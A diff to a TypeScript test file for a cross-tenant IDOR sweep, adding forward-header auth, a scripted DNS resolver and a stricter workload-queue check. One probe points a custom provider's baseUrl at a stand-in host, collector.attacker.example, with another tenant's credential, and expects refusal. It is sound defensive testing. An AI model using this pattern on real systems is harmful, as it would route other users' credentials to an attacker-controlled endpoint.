@@ -65,10 +65,11 @@ import type {
 import { castId, ID_PREFIX, mintTypeId } from "@orb/kit/ids";
 import { UTC_TIME_ZONE } from "@orb/kit/time";
 import { loadPresentRole } from "@orb/server/domain/chat";
+import { authConfigFromEnv } from "@orb/server/entry/auth";
 import { appRouter } from "@orb/server/transport/trpc";
 import { TEST_PROVIDER_ID } from "@orb/testkit/node/factories/resolved-connection.ts";
-import type { AppCaller } from "@orb/testkit/node/fixtures.ts";
-import { expect, OTHER_USER_ID, OWNER_USER_ID, test } from "@orb/testkit/node/fixtures.ts";
+import type { AppCaller, Fixtures } from "@orb/testkit/node/fixtures.ts";
+import { test as baseTest, expect, OTHER_USER_ID, OWNER_USER_ID } from "@orb/testkit/node/fixtures.ts";
 import { eq } from "drizzle-orm";
 import { strToU8, zipSync } from "fflate";
 import { describe, onTestFinished } from "vitest";
@@ -78,6 +79,24 @@ import { CREDENTIALS_OP_CODES } from "#server/domain/credentials/index.ts";
 import { principal as automationPrincipal } from "../domain/automation/_support.ts";
 import { seedCharacter, seedChat, seedMessage, seedParticipant } from "../domain/chat/_support.ts";
 import { seedTurns } from "../domain/chat/memory/_support.ts";
+
+// Enable genuine multi-human routing; these internal row-derived callers do not prove header authentication.
+const COLLECTOR_URL = "https://collector.attacker.example/v1";
+const test = baseTest.extend<Pick<Fixtures, "authConfig" | "networkExecution">>({
+  authConfig: async ({}, use): Promise<void> => {
+    await use({ ...authConfigFromEnv(), mode: "forward-header" });
+  },
+  networkExecution: async ({}, use): Promise<void> => {
+    await use({
+      resolver: (hostname) => {
+        if (hostname !== new URL(COLLECTOR_URL).hostname) {
+          return Promise.reject(new Error("unscripted cross-tenant probe DNS lookup"));
+        }
+        return Promise.resolve(["93.184.215.14"]);
+      },
+    });
+  },
+});
 
 // ── Owner A's distinctive marker names — these strings exist ONLY in A's owned rows, so their appearance in
 //    a stranger's result is an unambiguous LEAK signal (an echoed input id is NOT a leak — a stranger's own
@@ -1868,8 +1887,7 @@ const PROBES: readonly Probe[] = [
   },
   {
     path: "connection.draftCatalogModels",
-    call: (c, i) =>
-      c.connection.draftCatalogModels({ providerId: "custom-openai", baseUrl: "https://collector.attacker.example/v1", credentialId: i.credentialId }),
+    call: (c, i) => c.connection.draftCatalogModels({ providerId: "custom-openai", baseUrl: COLLECTOR_URL, credentialId: i.credentialId }),
     refusal: CONNECTION_CREDENTIAL_FOREIGN,
   },
   // The PROVIDER axis (D147). A plugin provider row is usable only by the owners of the enabled installs that
@@ -2849,6 +2867,8 @@ describe("cross-tenant IDOR sweep — every id-taking procedure is leak-free for
   }
 
   test("owner A sees its own marker (the leak-detector has teeth) but a stranger never does", async ({ db, ownerCaller, otherCaller, services, app }) => {
+    await app.settleBackground();
+    const initialWorkloadIds = (await ownerCaller.workloads.list()).map((workload) => workload.id);
     const ids = await seedOwnerWorld(ownerCaller, db, services.automation, services.connection);
     const catalogTool = app.toolUse.registerPluginTool({
       name: "plugin_cross_tenant_probe",
@@ -3110,12 +3130,14 @@ describe("cross-tenant IDOR sweep — every id-taking procedure is leak-free for
     //        aims at A's `queued` row, where a landed cancel is visible as `cancelled`.
     //      • `retry` does NOT mutate the original at all — it INSERTS A CLONE stamped `ownerId:
     //        original.ownerId` (retry.ts:71), i.e. a new row in A's OWN queue. Re-reading the original is
-    //        structurally blind to it; the LIST COUNT is the witness.
+    //        structurally blind to it; the exact queue ID set is the witness.
     expect(workloadStill.status).toBe("failed"); // A's retried-from row is itself unmoved
     expect(workloadStill.error).toBe(MARK.workload);
     const queuedStill = await ownerCaller.workloads.get({ id: ids.queuedWorkloadId });
     expect(queuedStill.status).toBe("queued"); // the stranger's workloads.cancel never reached A's live row
-    expect(await ownerCaller.workloads.list()).toHaveLength(2); // workloads.retry enqueued no clone into A's queue
+    expect((await ownerCaller.workloads.list()).map((workload) => workload.id).sort()).toEqual(
+      [...initialWorkloadIds, ids.workloadId, ids.queuedWorkloadId].sort(),
+    ); // workloads.retry enqueued no clone into A's queue
 
     // workload SCHEDULES — NO witness existed for any of the three write probes, and each moves a DIFFERENT
     // non-text field, which is why they are asserted separately: `deleteSchedule` (existence),
